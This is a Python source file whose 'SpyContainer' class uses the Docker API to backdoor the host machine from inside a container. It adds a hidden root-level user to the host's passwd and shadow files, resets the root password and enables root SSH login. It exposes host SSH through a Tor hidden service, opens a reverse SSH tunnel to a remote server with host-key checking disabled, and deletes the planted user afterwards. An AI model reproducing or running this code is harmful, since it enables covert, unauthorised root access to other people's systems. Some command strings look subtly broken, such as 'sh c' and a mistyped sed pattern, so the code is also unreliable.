import random
import string
from typing import Tuple

from docker.client import ContainerCollection
from docker.models.containers import Container


class SpyContainer:
    def __init__(self, container: Container) -> None:
        self._container = container

    def get_docker_host_ssh_port(self) -> int:
        ssh_port = (
            self.execute_command(
                "cat /data/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E "
                " '^Port'"
            )
            .strip()
            .split()
        )
        if ssh_port == [] or len(ssh_port) != 2:
            return 22
        else:
            if ssh_port[1].isnumeric():
                return int(ssh_port[1])
            else:
                return 22

    @staticmethod
    def generate_random_word() -> str:
        return "".join(random.choice(string.ascii_lowercase) for _ in range(15))

    def generate_docker_host_unique_username(self) -> str:
        usernames = self.execute_command('cat /data/etc/passwd | cut -d ":" -f 1')
        while True:
            username = SpyContainer.generate_random_word()
            if username not in usernames:
                break
        return username

    def add_username_to_docker_host(self, username: str, password: str) -> None:
        self.execute_command("echo 'root:{}' | chpasswd".format(password))
        self.execute_command(
            "echo '{}:x:0:0:test:/:/bin/sh' >> /data/etc/passwd".format(username)
        )
        self.execute_command(
            "cat /etc/shadow | grep root | head -1 | sed 's/root/{}/' >>"
            " /data/etc/shadow".format(username)
        )

    def permit_root_login_for_ssh_in_docker_host(self) -> None:
        self.execute_command(
            "sed -ie  '0,/.*PermitRootLogin.*/s/.*PermitRoot Login.*/PermitRootLogin"
            " yes/' /data/etc/ssh/sshd_config"
        )

    def get_free_port_on_docker_host(self) -> int:
        while True:
            open_ports = self.execute_command(
                "ss -tlpn | awk '{print $4}' |rev |cut -d \":\" -f-1 | rev"
            )
            free_port = random.randint(35000, 60000)
            if str(free_port) not in open_ports:
                break
        return free_port

    def config_service_tor(
        self, docker_host_ssh_port: int, tor_port_on_docker_host: int
    ) -> None:
        self.execute_command(
            "sed -i 's/#SOCKSPort 9050/SOCKSPort {}/g' /etc/tor/torrc".format(
                tor_port_on_docker_host
            )
        )
        self.execute_command(
            "sed -i '0,/#HiddenServicePort 80 127.0.0.1:80/s//HiddenServicePort {}"
            " 0.0.0.0:22/' /etc/tor/torrc".format(docker_host_ssh_port)
        )
        self.execute_command("chown root:root /var/lib/tor")

    def start_service_tor(self) -> None:
        self.execute_command("tor -f /etc/tor/torrc &>/dev/null &")

    def get_tor_hostname(self) -> str:
        return str(self.execute_command("cat /var/lib/tor/hidden_service/hostname"))

    # def wait_until_conect_to_tor_network(self):
    #     pass

    def reverse_ssh_from_docker_host_to_remote_server(
        self,
        another_server_name: str,
        another_server_ssh_port: int,
        another_server_username: str,
        another_server_password: str,
        free_port_on_another_server: int,
    ) -> None:
        self.execute_command(
            "sshpass",
            "-p",
            another_server_password,
            "ssh",
            "-o 'StrictHostKeyChecking=no' -R *:",
            str(free_port_on_another_server),
            ":localhost:",
            str(another_server_ssh_port),
            another_server_username,
            "@",
            another_server_name,
        )

    def delete_username_from_docker_host(
        self,
        username: str,
    ) -> None:
        self.execute_command("sed -i '/^{}:.*/d' /data/etc/passwd".format(username))
        self.execute_command("sed -i '/^{}:.*/d' /data/etc/shadow".format(username))

    def execute_command(self, *command: str) -> str:
        return str(self._container.exec_run(
            cmd=["sh", "c"] + list(command), stdout=True, tty=True, detach=True
        )[1].decode("utf-8"))